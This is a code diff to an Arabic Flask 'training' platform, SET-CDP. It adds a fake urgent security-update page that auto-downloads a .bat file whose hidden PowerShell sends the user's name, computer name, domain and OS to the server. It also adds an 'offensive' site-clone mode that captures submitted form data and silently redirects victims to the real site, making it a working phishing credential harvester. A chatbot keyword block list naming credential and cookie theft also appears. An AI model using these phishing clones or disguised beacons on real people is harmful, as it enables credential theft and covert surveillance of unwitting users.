@@ -16,7 +16,7 @@ import psutil
 import platform
 import time
 import mimetypes
-
+from flask import render_template_string
 
 # ==================== CONFIGURATION ====================
 
@@ -775,36 +775,140 @@ exit
 """
     log_scan("usb_payload_generator", server_url, "تم إنشاء ملف محاكاة USB بخصائص الاستطلاع المتقدم", "Info")
     return jsonify({'success': True, 'payload': bat_content, 'filename': 'Important_University_Documents.bat'})
+# ==================== DRIVE-BY DOWNLOAD SIMULATION ====================
 
+@app.route('/simulations/auto-download')
+@login_required
+def auto_download_simulation():
+    """
+    صفحة هبوط وهمية (Landing Page). 
+    تحتوي على كود JavaScript بسيط يوجه المتصفح لتنزيل الملف تلقائياً فور فتح الصفحة.
+    """
+    html_content = '''
+    <!DOCTYPE html>
+    <html dir="rtl" lang="ar">
+    <head>
+        <meta charset="UTF-8">
+        <title>تحديث النظام العاجل</title>
+        <style>
+            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin-top: 15%; background-color: #f8fafc; color: #0f172a; }
+            .box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); display: inline-block; max-width: 500px; border-top: 4px solid #0ea5e9; }
+            .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0ea5e9; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
+            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+            .btn { display: inline-block; margin-top: 20px; padding: 12px 24px; background: #0f172a; color: white; text-decoration: none; border-radius: 8px; font-weight: bold; transition: 0.2s; }
+            .btn:hover { background: #0ea5e9; }
+            .note { margin-top: 15px; font-size: 12px; color: #64748b; }
+        </style>
+    </head>
+    <body>
+        <div class="box">
+            <div class="spinner"></div>
+            <h2 style="margin:0 0 10px 0;">📥 جارٍ تنزيل التحديث الأمني...</h2>
+            <p>يرجى الانتظار، سيبدأ تنزيل الملف المطلوب تلقائياً لحماية جهازك.</p>
+            <a href="/api/serve-payload" class="btn" id="manual-dl">تنزيل الملف يدوياً</a>
+            <p class="note">هذه الصفحة جزء من منصة SET-CDP للتدريب والمحاكاة.</p>
+        </div>
+
+        <script>
+            // آلية التنزيل التلقائي (Drive-by Simulation)
+            // نستخدم setTimeout لإعطاء واقعية للصفحة قبل بدء التنزيل
+            setTimeout(function() {
+                // توجيه المتصفح لتحميل مسار الملف المخفي
+                window.location.href = "/api/serve-payload";
+            }, 1500); // 1.5 ثانية
+        </script>
+    </body>
+    </html>
+    '''
+    return render_template_string(html_content)
+
+@app.route('/api/serve-payload')
+@login_required
+def serve_payload():
+    """
+    هذا المسار يقوم بإنشاء ملف הـ Batch (Beacon) على الطاير (On-the-fly) 
+    وإرساله كـ Attachment ليقوم المتصفح بتنزيله.
+    """
+    # الحصول على رابط السيرفر الحالي تلقائياً
+    server_url = request.host_url.rstrip('/')
+    user_id = session.get('user_id', 'anonymous')
+    
+    # محتوى الملف التدريبي (آمن، يقوم فقط بإرسال معلومات الجهاز الأساسية)
+    bat_content = f"""@echo off
+:: SET-CDP Drive-by Download Training Payload
+:: This file simulates an auto-downloaded beacon.
+
+set SERVER_URL={server_url}/api/capture-submit
+set SITE_NAME=Auto_Download_Simulation
+
+powershell -WindowStyle Hidden -Command "$os=(Get-WmiObject Win32_OperatingSystem).Caption; $data = @{{site='%SITE_NAME%'; form_data=@{{username=$env:USERNAME; password='[BEACON_EXECUTED]'; computername=$env:COMPUTERNAME; user_domain=$env:USERDOMAIN; os_version=$os; execution_path=$PWD.Path; creator_id='{user_id}'; attack_type='Drive_by_Download'}}}}; $json = $data | ConvertTo-Json -Depth 10; try {{ Invoke-RestMethod -Uri '%SERVER_URL%' -Method Post -Body $json -ContentType 'application/json' -UseBasicParsing }} catch {{ }}"
+exit
+"""
+    
+    # تحويل النص إلى بايتات لإرساله كملف
+    file_bytes = BytesIO(bat_content.encode('utf-8'))
+    
+    # تسجيل العملية في النظام
+    try:
+        log_scan("auto_download_simulation", server_url, "تم إرسال حمولة التنزيل التلقائي للضحية", "Info")
+    except Exception:
+        pass
+
+    # إرسال الملف للمتصفح ليبدأ التنزيل
+    return send_file(
+        file_bytes,
+        as_attachment=True,
+        download_name='Security_Update_v2.bat',
+        mimetype='application/x-msdos-program'
+    )
 @app.route('/api/clone-site', methods=['POST'])
 @login_required
 def api_clone_site():
     data = request.get_json() or {}
+    
+    # 1. تم تصحيح الأسماء لتتطابق مع دوال app.py الخاص بك
     url = normalize_url(data.get('url', ''))
     name = safe_name(data.get('name') or 'clone_' + datetime.now().strftime('%Y%m%d%H%M%S'))
+    
+    # 2. التحقق من أمان الرابط (منع SSRF)
     parsed = urlparse(url)
     safe, msg = is_safe_hostname(parsed.hostname)
-    if not safe: return jsonify({'error': msg}), 400
-    
+    if not safe: 
+        return jsonify({'error': msg}), 400
+
+    # 3. تحديد نمط العملية (تدريبي أم هجومي)
+    mode = data.get('mode', 'educational')
+    # حماية: نضمن أن الأدمن فقط هو من يمكنه استخدام الوضع الهجومي
+    if mode == 'offensive' and session.get('role') != 'admin':
+        mode = 'educational'
+
     try:
         r = requests.get(url, timeout=15, headers={'User-Agent': 'Mozilla/5.0 SET-CDP Educational Clone'}, allow_redirects=True)
         r.raise_for_status()
         soup = BeautifulSoup(r.text, 'html.parser')
         
         if soup.head:
-            base = soup.new_tag('base', href=url); soup.head.insert(0, base)
-            meta = soup.new_tag('meta'); meta.attrs['charset'] = 'utf-8'; soup.head.insert(0, meta)
+            base = soup.new_tag('base', href=url)
+            soup.head.insert(0, base)
+            meta = soup.new_tag('meta')
+            meta.attrs['charset'] = 'utf-8'
+            soup.head.insert(0, meta)
             
         for script in soup.find_all('script'): script.decompose()
-        
-        for form in soup.find_all('form'):
+        for form in soup.find_all('form'): 
             form['action'] = '#'
             form['onsubmit'] = 'return false;'
             
         if not soup.body: soup.append(soup.new_tag('body'))
         
-        banner = soup.new_tag('div')
-        
+        # 4. تحديد رابط التوجيه (Redirect URL) بناءً على النمط
+        if mode == 'offensive':
+            # توجيه للموقع الأصلي بدون أن يشعر الضحية
+            redirect_js = f"var redirectUrl = '{url}';"
+        else:
+            # توجيه لصفحة التوعية التعليمية
+            redirect_js = "var redirectUrl = window.location.origin + '/awareness-training';"
+
         js = soup.new_tag('script')
         js.string = f'''
         (function(){{
@@ -822,14 +926,12 @@ def api_clone_site():
                 }});
                 
                 if(!hasData) return; 
-                
                 if(e) {{ e.preventDefault(); e.stopPropagation(); }}
                 
                 var siteName = "{name}";
-                var captureUrl = window.location.origin + '/api/capture-submit';
-                var redirectUrl = window.location.origin + '/awareness-training';
+                {redirect_js}
                 
-                fetch(captureUrl, {{
+                fetch(window.location.origin + '/api/capture-submit', {{
                     method: 'POST',
                     headers: {{'Content-Type': 'application/json'}},
                     body: JSON.stringify({{site: siteName, form_data: data}})
@@ -839,20 +941,17 @@ def api_clone_site():
             }}
             
             document.addEventListener('submit', function(e){{ captureAndSend(e); }}, true);
-            
             document.addEventListener('click', function(e){{
                 var t = e.target;
                 var isButton = t.tagName === 'BUTTON' || t.closest('button') || (t.tagName === 'INPUT' && (t.type === 'submit' || t.type === 'button'));
                 var isLoginLink = t.tagName === 'A' && (t.innerText.toLowerCase().includes('login') || t.innerText.includes('دخول') || t.innerText.includes('sign in'));
                 if(isButton || isLoginLink) {{ captureAndSend(e); }}
             }}, true);
-            
             document.addEventListener('keypress', function(e){{
                 if(e.key === 'Enter') {{ captureAndSend(e); }}
             }}, true);
         }})();
         '''
-        soup.body.insert(0, banner)
         soup.body.append(js)
         
         path = os.path.join(app.config['CLONES_FOLDER'], name + '.html')
@@ -866,7 +965,8 @@ def api_clone_site():
         conn.commit()
         conn.close()
         return jsonify({'success': True, 'clone_name': name, 'url': '/view-clone/' + name})
-    except Exception as e: return jsonify({'error': 'Failed to clone: ' + str(e)}), 400
+    except Exception as e: 
+        return jsonify({'error': 'Failed to clone: ' + str(e)}), 400
 
 @app.route('/view-clone/<name>')
 def view_clone(name): return render_template('clones/' + safe_name(name) + '.html')
@@ -2242,47 +2342,35 @@ def api_edr_kill(pid):
     except Exception as e: return jsonify({"ok": False, "error": str(e)}), 500
 
 
-#==============================
 # =========================================================
-# SET-CDP Awareness Chatbot API
-# =========================================================
-# =========================================================
-# SET-CDP Awareness Chatbot API - Enhanced Version
+# SET-CDP Tactical Ops AI (Chatbot API) - Advanced Arsenal Version
 # =========================================================
 
 import time
 import re
 from flask import request, jsonify
 
-# Rate limit بسيط لحماية Endpoint من كثرة الطلبات
+# Rate limit لحماية الـ Endpoint من الاستعلامات المفرطة (DDoS/Spam Prevention)
 CHATBOT_RATE_LIMIT = {}
-CHATBOT_MAX_REQUESTS = 20      # عدد الطلبات
-CHATBOT_WINDOW_SECONDS = 60    # خلال دقيقة واحدة
+CHATBOT_MAX_REQUESTS = 20      # عدد الطلبات المسموحة
+CHATBOT_WINDOW_SECONDS = 60    # خلال نافذة زمنية (60 ثانية)
 
 
 def normalize_chat_text(text):
     """
-    Normalize Arabic/English user input for easier keyword matching.
+    تطبيع النصوص العربية والإنجليزية لتسهيل مطابقة الكلمات المفتاحية (Keyword Extraction).
     """
     text = (text or "").strip().lower()
 
     replacements = {
-        "أ": "ا",
-        "إ": "ا",
-        "آ": "ا",
-        "ى": "ي",
-        "ة": "ه",
-        "ؤ": "و",
-        "ئ": "ي",
-        "ـ": "",
+        "أ": "ا", "إ": "ا", "آ": "ا", "ى": "ي",
+        "ة": "ه", "ؤ": "و", "ئ": "ي", "ـ": "",
     }
 
     for old, new in replacements.items():
         text = text.replace(old, new)
 
-    # إزالة التكرارات والمسافات الزائدة
     text = re.sub(r"\s+", " ", text)
-
     return text
 
 
@@ -2292,8 +2380,7 @@ def has_any(text, words):
 
 def make_reply(reply, category="general", suggestions=None, quick_links=None):
     """
-    Standard chatbot response format.
-    الواجهة الحالية تستخدم reply فقط، لكن باقي الحقول مفيدة للتطوير لاحقاً.
+    بناء حزمة الاستجابة (Response Payload) للواجهة الأمامية.
     """
     return {
         "reply": reply,
@@ -2305,11 +2392,9 @@ def make_reply(reply, category="general", suggestions=None, quick_links=None):
 
 def is_rate_limited(client_ip):
     """
-    Simple in-memory rate limiter.
-    مناسب للمشروع المحلي والتجريبي.
+    نظام تقييد الطلبات (Rate Limiting) في الذاكرة.
     """
     now_ts = time.time()
-
     records = CHATBOT_RATE_LIMIT.get(client_ip, [])
     records = [t for t in records if now_ts - t < CHATBOT_WINDOW_SECONDS]
 
@@ -2324,65 +2409,26 @@ def is_rate_limited(client_ip):
 
 def is_unsafe_chat_request(msg):
     """
-    Ethical guardrail.
-    لا نحظر كلمات تعليمية مثل cookies وحدها.
-    نحظر فقط العبارات التي تطلب سرقة أو اختراق أو إساءة استخدام.
+    قواعد الاشتباك (Rules of Engagement - ROE).
+    حظر الاستعلامات التي تطلب أدوات اختراق فعلية غير مصرح بها.
     """
-
     unsafe_phrases = [
         # Arabic unsafe intent
-        "كيف اسرق",
-        "اريد اسرق",
-        "بدي اسرق",
-        "سرقه حساب",
-        "سرقة حساب",
-        "سرقه كلمه مرور",
-        "سرقة كلمة مرور",
-        "سرقه باسورد",
-        "سرقة باسورد",
-        "اختراق حساب",
-        "تهكير حساب",
-        "اختراق فيسبوك",
-        "تهكير فيسبوك",
-        "اختراق انستغرام",
-        "تهكير انستغرام",
-        "اختراق انستا",
-        "سرقه كوكيز",
-        "سرقة كوكيز",
-        "سرقه الجلسه",
-        "سرقة الجلسة",
-        "خطف الجلسه",
-        "خطف الجلسة",
-        "كيف اخذ باسورد",
-        "كيف اطلع باسورد",
-        "كيف اسحب باسورد",
-        "كيف اخذ كلمه المرور",
-        "كلمه مرور حقيقيه",
-        "باسورد حقيقي",
-        "جمع كلمات مرور",
-        "التقاط كلمات مرور",
-        "صيد كلمات مرور",
+        "كيف اسرق", "اريد اسرق", "بدي اسرق", "سرقه حساب", "سرقة حساب",
+        "سرقه كلمه مرور", "سرقة كلمة مرور", "سرقه باسورد", "سرقة باسورد",
+        "اختراق حساب", "تهكير حساب", "اختراق فيسبوك", "تهكير فيسبوك",
+        "اختراق انستغرام", "تهكير انستغرام", "اختراق انستا",
+        "سرقه كوكيز", "سرقة كوكيز", "سرقه الجلسه", "سرقة الجلسة",
+        "خطف الجلسه", "خطف الجلسة", "كيف اخذ باسورد", "كيف اطلع باسورد",
+        "كيف اسحب باسورد", "كيف اخذ كلمه المرور", "كلمه مرور حقيقيه",
+        "باسورد حقيقي", "جمع كلمات مرور", "التقاط كلمات مرور", "صيد كلمات مرور",
 
         # English unsafe intent
-        "steal password",
-        "steal passwords",
-        "steal cookies",
-        "cookie theft",
-        "session hijack",
-        "session hijacking",
-        "hack facebook",
-        "hack instagram",
-        "phishing real",
-        "real phishing",
-        "credential stealing",
-        "credential theft",
-        "password grabber",
-        "cookie grabber",
-        "token stealer",
-        "steal session",
-        "account hacking",
+        "steal password", "steal passwords", "steal cookies", "cookie theft",
+        "session hijack", "session hijacking", "hack facebook", "hack instagram",
+        "phishing real", "real phishing", "credential stealing", "credential theft",
+        "password grabber", "cookie grabber", "token stealer", "steal session", "account hacking",
     ]
-
     return has_any(msg, unsafe_phrases)
 
 
@@ -2391,48 +2437,48 @@ def chatbot_reply(user_message):
 
     if not msg:
         return make_reply(
-            "اكتب سؤالك وسأساعدك في استخدام منصة SET-CDP.",
+            "[SYS_READY] أدخل استعلامك. يمكنني توجيهك لاستخدام ترسانة SET-CDP الهجومية والدفاعية.",
             "general",
             suggestions=[
                 "ما هي SET-CDP؟",
-                "كيف أفحص رابط؟",
-                "ما هو Mini-EDR؟",
-                "ما هي CookieShield؟"
+                "كيف أستطلع هدفاً؟",
+                "كيف أنشر فخ اختراق؟",
+                "ما هو Mini-SOC؟"
             ]
         )
 
     # =====================================================
-    # Ethical Guardrail
+    # Ethical Guardrail (ROE Compliance)
     # =====================================================
     if is_unsafe_chat_request(msg):
         return make_reply(
             (
-                "لا أستطيع المساعدة في سرقة الحسابات أو كلمات المرور أو الجلسات أو تنفيذ أي استخدام غير مصرح به. "
-                "منصة SET-CDP مخصصة للتدريب، التوعية، الفحص الدفاعي، ومحاكاة المخاطر داخل بيئة أخلاقية وآمنة. "
-                "يمكنني بدلاً من ذلك مساعدتك في فهم التصيد، حماية الحسابات، تحليل الروابط، وتطبيق ممارسات دفاعية سليمة."
+                "[تحذير أمني] طلبك ينتهك قواعد الاشتباك (Rules of Engagement). "
+                "ترسانة SET-CDP مصممة لمحاكاة التهديدات (Adversary Simulation) والتحليل الدفاعي (Blue Teaming) في البيئات المصرح بها فقط. "
+                "لن يتم تقديم أي مساعدة لتنفيذ هجمات غير قانونية. يمكنني بدلاً من ذلك توجيهك لطرق تأمين الأنظمة واكتشاف الثغرات."
             ),
             "safety",
             suggestions=[
-                "كيف أكتشف التصيد؟",
-                "كيف أحمي حسابي؟",
-                "ما هي المصادقة الثنائية؟"
+                "كيف يتم كشف التصيد؟",
+                "كيف أحمي الجلسات (Sessions)؟",
+                "ما هي المصادقة الثنائية (MFA)؟"
             ]
         )
 
     # =====================================================
     # Greetings
     # =====================================================
-    if has_any(msg, ["مرحبا", "اهلا", "السلام عليكم", "هاي", "hello", "hi"]):
+    if has_any(msg, ["مرحبا", "اهلا", "السلام عليكم", "هاي", "hello", "hi", "مسموع"]):
         return make_reply(
             (
-                "أهلاً بك 👋 أنا مساعد SET-CDP. "
-                "يمكنني شرح أدوات الفحص، Mini-EDR، Endpoint Agent، الإضافات، القوالب، الامتحان، ونصائح الحماية."
+                "[SECURE_CHANNEL_ESTABLISHED] تم تأمين الاتصال. أنا الموجه التكتيكي لترسانة SET-CDP (Ops AI). "
+                "جاهز لتزويدك بالمعلومات الاستخباراتية حول أدوات الاستطلاع (Recon)، المحاكاة الهجومية (Red Teaming)، أو مراقبة التهديدات (SOC)."
             ),
             "greeting",
             suggestions=[
-                "ما هي أدوات الفحص؟",
-                "كيف أفحص رابط؟",
-                "ما هو Endpoint Agent؟"
+                "ما هي أدوات الاستطلاع؟",
+                "كيف أنفذ هجوم محاكاة؟",
+                "ما هو الـ Endpoint Agent؟"
             ]
         )
 
@@ -2442,384 +2488,283 @@ def chatbot_reply(user_message):
     if has_any(msg, ["ما هي set", "ما هي المنصه", "شو هي المنصه", "set-cdp", "عن المشروع", "من نحن", "فكره المشروع"]):
         return make_reply(
             (
-                "SET-CDP هي منصة تعليمية في الأمن السيبراني تجمع بين التوعية الأمنية، أدوات الفحص الدفاعي، "
-                "محاكاة التهديدات، الاختبارات التعليمية، إضافات المتصفح، ومراقبة الأجهزة عبر Mini-EDR. "
-                "الهدف منها هو التدريب والفهم العملي داخل بيئة آمنة وأخلاقية."
+                "SET-CDP هي ترسانة عمليات سيبرانية (Cyber Operations Platform) تدمج التكتيكات الهجومية (Red Teaming) "
+                "بأدوات التحليل الدفاعي (Blue Teaming) والمراقبة الحية (Mini-SOC). "
+                "الهدف الاستراتيجي منها هو تقييم الجاهزية الأمنية وتدريب الكوادر عبر محاكاة التهديدات في بيئة معزولة."
             ),
             "about",
             quick_links=[
-                {"title": "من نحن", "url": "/about"},
-                {"title": "أدوات الفحص", "url": "/"},
-                {"title": "الإضافات", "url": "/extensions"}
+                {"title": "عقيدة النظام (CONOPS)", "url": "/about"},
+                {"title": "مسرح العمليات", "url": "/attack"},
+                {"title": "ترسانة الاستطلاع", "url": "/"}
             ]
         )
 
     # =====================================================
-    # Tools Overview
+    # Tools Overview (Blue Team Arsenal)
     # =====================================================
-    if has_any(msg, ["ادوات", "الادوات", "الفحص", "فحص", "scanner", "tools", "شو الادوات"]):
+    if has_any(msg, ["ادوات", "الادوات", "الفحص", "فحص", "scanner", "tools", "شو الادوات", "استطلاع", "recon"]):
         return make_reply(
             (
-                "أدوات الفحص في SET-CDP تشمل: Website Security Scanner، SSL Inspector، URL Safety Checker، "
-                "Header Security Analyzer، Password Analyzer، File Hash Analyzer، Email Phishing Detector، "
-                "URL Expander، ومولد كلمات المرور. بعض الأدوات تعمل محلياً داخل المتصفح لحماية الخصوصية."
+                "ترسانة الاستطلاع (Blue Teaming Arsenal) في SET-CDP تشمل: "
+                "Target Recon (لفحص البنية التحتية)، Crypto Interceptor (لتحليل الـ SSL)، "
+                "SocEng Payload Extractor (لتحليل التصيد)، Malware Forensics Sandbox (للهندسة العكسية للملفات)، "
+                "و Obfuscation Tracer (لتتبع الروابط المخفية)."
             ),
             "tools",
             suggestions=[
-                "كيف أفحص رابط؟",
-                "ما هو SSL؟",
-                "ما هو Header Analyzer؟",
-                "كيف أحلل كلمة مرور؟"
+                "كيف أحلل ملفاً مشبوهاً؟",
+                "ما هو Crypto Interceptor؟",
+                "كيف أتتبع رابط تمويه؟"
             ],
             quick_links=[
-                {"title": "فتح أدوات الفحص", "url": "/"}
+                {"title": "فتح ترسانة الاستطلاع", "url": "/"}
             ]
         )
 
     # =====================================================
-    # Website Security Scanner
+    # Website Security Scanner (Recon)
     # =====================================================
-    if has_any(msg, ["website scanner", "website security", "فحص موقع", "فحص الموقع", "تقييم موقع", "security score"]):
+    if has_any(msg, ["website scanner", "website security", "فحص موقع", "فحص الموقع", "تقييم موقع", "target recon", "بنية تحتية"]):
         return make_reply(
             (
-                "Website Security Scanner يفحص مؤشرات أمان الموقع مثل استخدام HTTPS وبعض إعدادات الحماية الأساسية، "
-                "ثم يعطي ملخصاً أو Security Score يساعدك على فهم مستوى الأمان بشكل سريع."
+                "أداة Target Recon & Vuln Scanner تنفذ استطلاعاً نشطاً للبنية التحتية، تفحص استخدام بروتوكولات التشفير، "
+                "وتكشف غياب هيدرز الحماية الأساسية، ثم تصدر تقييم لسطح الهجوم (Attack Surface) الخاص بالهدف."
             ),
             "website_scanner",
-            quick_links=[
-                {"title": "أدوات الفحص", "url": "/"}
-            ]
+            quick_links=[{"title": "ترسانة الاستطلاع", "url": "/"}]
         )
 
     # =====================================================
-    # SSL
+    # SSL (Crypto Interceptor)
     # =====================================================
-    if has_any(msg, ["ssl", "شهاده", "شهادة", "https", "certificate", "cert"]):
+    if has_any(msg, ["ssl", "شهاده", "شهادة", "https", "certificate", "cert", "crypto", "تشفير", "اعتراض"]):
         return make_reply(
             (
-                "SSL Inspector يفحص شهادة الموقع، مثل صلاحية الشهادة، تاريخ الانتهاء، والجهة المصدرة. "
-                "وجود HTTPS وشهادة صالحة لا يعني أن الموقع آمن 100%، لكنه مؤشر مهم لحماية الاتصال بينك وبين الموقع."
+                "وحدة Crypto/SSL Interceptor تحلل قناة التشفير للهدف، تكشف ضعف البروتوكولات المستخدمة (مثل TLSv1 القديم)، "
+                "وتحدد قابلية الهدف للاختراق عبر هجمات الرجل في المنتصف (MITM)."
             ),
             "ssl",
-            suggestions=[
-                "كيف أعرف الرابط المشبوه؟",
-                "ما هو Header Analyzer؟"
-            ]
+            suggestions=["ما هو محلل الهيدرز؟", "كيف أفحص رابط؟"]
         )
 
     # =====================================================
-    # Header Analyzer
+    # Header Analyzer (Exploit Surface)
     # =====================================================
-    if has_any(msg, ["header", "headers", "الهيدر", "الهيدرز", "csp", "hsts", "x-frame", "content security policy"]):
+    if has_any(msg, ["header", "headers", "الهيدر", "الهيدرز", "csp", "hsts", "x-frame", "exploit surface"]):
         return make_reply(
             (
-                "Header Security Analyzer يفحص ترويسات الحماية في الموقع مثل HSTS و CSP و X-Frame-Options "
-                "و X-Content-Type-Options. هذه الترويسات تساعد في تقليل مخاطر مثل Clickjacking و XSS وبعض الهجمات على المتصفح."
+                "محلل سطح الاستغلال (Server Exploit Surface Analyzer) يكتشف غياب السياسات الأمنية (Security Headers) "
+                "مثل CSP و HSTS، وهو ما يسهل على المهاجمين تنفيذ هجمات حقن السكربتات (XSS) والـ Clickjacking."
             ),
             "headers",
-            quick_links=[
-                {"title": "أدوات الفحص", "url": "/"}
-            ]
+            quick_links=[{"title": "ترسانة الاستطلاع", "url": "/"}]
         )
 
     # =====================================================
-    # URL Safety
+    # URL Safety (Threat Intel)
     # =====================================================
-    if has_any(msg, ["رابط", "url", "لينك", "مشبوه", "تصيد", "phishing", "رابط مشبوه"]):
+    if has_any(msg, ["رابط", "url", "لينك", "مشبوه", "تصيد", "phishing", "رابط مشبوه", "threat intel"]):
         return make_reply(
             (
-                "لفحص الروابط استخدم URL Safety Checker. انتبه إلى الروابط المختصرة، الأخطاء الإملائية في اسم النطاق، "
-                "استخدام HTTP بدل HTTPS، وجود رموز غريبة، أو نطاقات تحاول تقليد مواقع معروفة."
+                "أداة Threat Intel URL Scanner تنفذ استطلاعاً سلبياً (OSINT) على الروابط. "
+                "تبحث عن أساليب التمويه (Obfuscation)، انتحال النطاقات عبر الـ Punycode، وإخفاء مسار الخادم خلف IPs عارية."
             ),
             "url",
-            suggestions=[
-                "ما هو URL Expander؟",
-                "كيف أكتشف التصيد؟"
-            ],
-            quick_links=[
-                {"title": "فحص الروابط", "url": "/"}
-            ]
+            suggestions=["كيف أتتبع التحويلات؟", "كيف أستخرج الحمولات؟"],
+            quick_links=[{"title": "تحليل الروابط", "url": "/"}]
         )
 
     # =====================================================
-    # URL Expander
+    # URL Expander (Traceroute)
     # =====================================================
-    if has_any(msg, ["short url", "shortener", "رابط مختصر", "روابط مختصره", "url expander", "bit.ly", "tinyurl", "فك الرابط"]):
+    if has_any(msg, ["short url", "shortener", "رابط مختصر", "روابط مختصره", "url expander", "bit.ly", "tinyurl", "فك الرابط", "تتبع", "trace"]):
         return make_reply(
             (
-                "URL Expander يساعدك على كشف الرابط النهائي خلف الروابط المختصرة مثل bit.ly أو tinyurl. "
-                "هذا مفيد لأن بعض هجمات التصيد تستخدم روابط مختصرة لإخفاء الوجهة الحقيقية."
+                "أداة Obfuscation Tracer تتتبع سلاسل التحويل (Redirect Chains) التي يستخدمها المهاجمون لإخفاء "
+                "الوجهة النهائية (Payload Destination). تتيح لك كشف الخادم الحقيقي خلف الروابط المختصرة."
             ),
             "url_expander"
         )
 
     # =====================================================
-    # Password Analyzer / Generator
+    # Password Analyzer / Generator (Brute-Force & Keygen)
     # =====================================================
-    if has_any(msg, ["كلمه مرور", "كلمة مرور", "باسورد", "password", "قويه", "قوية", "مولد", "generator"]):
+    if has_any(msg, ["كلمه مرور", "كلمة مرور", "باسورد", "password", "قويه", "قوية", "مولد", "generator", "brute force", "تخمين", "مفتاح"]):
         return make_reply(
             (
-                "Password Strength Analyzer يقيّم قوة كلمة المرور محلياً دون حفظها أو إرسالها للسيرفر. "
-                "كلمة المرور الجيدة تكون طويلة، عشوائية، وتحتوي على أحرف كبيرة وصغيرة وأرقام ورموز. "
-                "يمكنك أيضاً استخدام Secure Password Generator لتوليد كلمة قوية."
+                "وحدة Brute-Force Strength Tester تحلل مقاومة المفاتيح وكلمات المرور لهجمات التخمين وقواميس الاختراق. "
+                "بينما تتيح لك أداة Cryptographic Key Generator توليد مفاتيح تشفير محصنة (بأطوال تصل لـ 64-bit) محلياً لحماية أنظمتك."
             ),
-            "password",
-            suggestions=[
-                "نصائح حماية",
-                "ما هي المصادقة الثنائية؟"
-            ]
+            "password"
         )
 
     # =====================================================
-    # File Hash / Metadata
+    # File Hash / Metadata (Forensics)
     # =====================================================
-    if has_any(msg, ["ملف", "hash", "sha", "sha-256", "هاش", "metadata", "pdf", "صوره", "صورة", "file"]):
+    if has_any(msg, ["ملف", "hash", "sha", "sha-256", "هاش", "metadata", "pdf", "صوره", "صورة", "file", "forensics", "هندسة عكسية", "malware", "خبيث"]):
         return make_reply(
             (
-                "File Hash & Metadata Analyzer يحسب بصمة الملف SHA-256 محلياً داخل المتصفح، "
-                "ويمكن استخدام الهاش للتحقق من سلامة الملف أو مقارنته بنسخة موثوقة. "
-                "الفكرة أن الهاش يعرّف الملف دون الحاجة لقراءة محتواه."
+                "منصة Malware Forensics Sandbox تقوم بهندسة عكسية مصغرة (Static Analysis). "
+                "تستخرج البصمات (Hashes)، الميتاداتا العميقة، وقيم الانتروبي (Entropy) لكشف البرمجيات الخبيثة المدمجة (Packed Malware) داخل الملفات."
             ),
             "file"
         )
 
     # =====================================================
-    # Email Phishing
+    # Email Phishing (Payload Extractor)
     # =====================================================
-    if has_any(msg, ["ايميل", "email", "رساله", "رسالة", "بريد", "phishing email", "بريد مشبوه"]):
+    if has_any(msg, ["ايميل", "email", "رساله", "رسالة", "بريد", "phishing email", "بريد مشبوه", "soceng", "هندسة اجتماعية"]):
         return make_reply(
             (
-                "Email Phishing Detector يفحص نص الرسالة بحثاً عن مؤشرات تصيد مثل الاستعجال، طلب كلمة المرور، "
-                "روابط غريبة، تهديد بإغلاق الحساب، أو عبارات مثل: تحقق من حسابك فوراً. "
-                "دائماً تأكد من المرسل والرابط قبل الضغط."
+                "مستخرج حمولات الهندسة الاجتماعية (SocEng Payload Extractor) يحلل رسائل التصيد "
+                "لاستخراج مؤشرات الاختراق (IOCs) والتكتيكات النفسية المستخدمة، وتحديد الروابط الملغمة (Weaponized Links)."
             ),
-            "email",
-            suggestions=[
-                "كيف أكتشف التصيد؟",
-                "كيف أفحص رابط؟"
-            ]
+            "email"
         )
 
     # =====================================================
     # Mini-EDR / SOC
     # =====================================================
-    if has_any(msg, ["edr", "soc", "mini-edr", "mini soc", "monitor", "مراقبه", "مراقبة", "live soc"]):
+    if has_any(msg, ["edr", "soc", "mini-edr", "mini soc", "monitor", "مراقبه", "مراقبة", "live soc", "مركز عمليات"]):
         return make_reply(
             (
-                "Mini-EDR Live Monitor هو جزء دفاعي في SET-CDP يعرض العمليات، الاتصالات، استهلاك الموارد، "
-                "والتنبيهات الأمنية. الهدف منه تعليمي لفهم فكرة المراقبة المركزية والاستجابة الأمنية داخل بيئة مصرح بها."
+                "لوحة C2 & Mini-SOC هي مركز عمليات مصغر. تعرض القياسات الحية (Telemetry) من الأجهزة الطرفية، "
+                "وترصد الاتصالات الشبكية العكسية (Reverse Connections) والعمليات المريبة لتنفيذ صيد التهديدات (Threat Hunting)."
             ),
             "edr",
             quick_links=[
-                {"title": "Live SOC Monitor", "url": "/edr"},
-                {"title": "Endpoint Devices", "url": "/edr/devices"}
+                {"title": "لوحة المراقبة (SOC)", "url": "/edr"},
+                {"title": "الأجهزة المرتبطة", "url": "/edr/devices"}
             ]
         )
 
     # =====================================================
     # Endpoint Agent / Devices
     # =====================================================
-    if has_any(msg, ["agent", "عميل", "endpoint", "جهاز", "اجهزه", "أجهزة", "devices", "تحميل agent", "heartbeat"]):
+    if has_any(msg, ["agent", "عميل", "endpoint", "جهاز", "اجهزه", "أجهزة", "devices", "تحميل agent", "heartbeat", "beacon"]):
         return make_reply(
             (
-                "SET-CDP Endpoint Agent هو برنامج تدريبي بسيط يتم تشغيله على الأجهزة المصرح بها لإرسال Heartbeat للسيرفر، "
-                "مثل اسم الجهاز، نظام التشغيل، IP المحلي، CPU وRAM. تظهر هذه الأجهزة في صفحة Endpoint Device Center."
+                "الـ Endpoint Agent هو برنامج (يعمل كـ Beacon) يُنشر في الأجهزة المصرح بها. "
+                "يفتح قناة اتصال لإرسال نبضات (Heartbeats) متضمنة بيانات النظام والموارد والشبكة إلى خادم القيادة والسيطرة (C2)."
             ),
             "agent",
             quick_links=[
-                {"title": "Endpoint Devices", "url": "/edr/devices"},
-                {"title": "Agent Download", "url": "/edr/download"}
+                {"title": "إدارة الأجهزة", "url": "/edr/devices"},
+                {"title": "تحميل Agent", "url": "/edr/download"}
             ]
         )
 
     # =====================================================
-    # Browser Extensions
+    # Browser Extensions (Plugins)
     # =====================================================
-    if has_any(msg, ["extension", "extensions", "اضافه", "إضافة", "اضافات", "إضافات", "متصفح", "browser"]):
+    if has_any(msg, ["extension", "extensions", "اضافه", "إضافة", "اضافات", "إضافات", "متصفح", "browser", "plugins"]):
